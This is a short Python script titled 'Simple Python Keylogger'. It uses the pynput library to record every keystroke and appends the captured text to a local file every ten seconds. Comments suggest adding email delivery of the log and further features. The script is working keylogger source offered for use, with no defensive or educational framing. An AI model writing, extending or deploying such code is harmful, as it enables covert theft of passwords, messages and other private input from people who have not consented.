
# Simple Python Keylogger
import pynput.keyboard
import threading

log = ""

def callback_function(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def send_log():
    global log
    # Here you can add functionality to send the log to an email or save it to a file
    with open("keylog.txt", "a") as f:
        f.write(log)
    log = ""
    timer = threading.Timer(10, send_log)
    timer.start()

# Start capturing keystrokes
keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)

with keyboard_listener:
    send_log()
    keyboard_listener.join()

#keep adding your own functionality
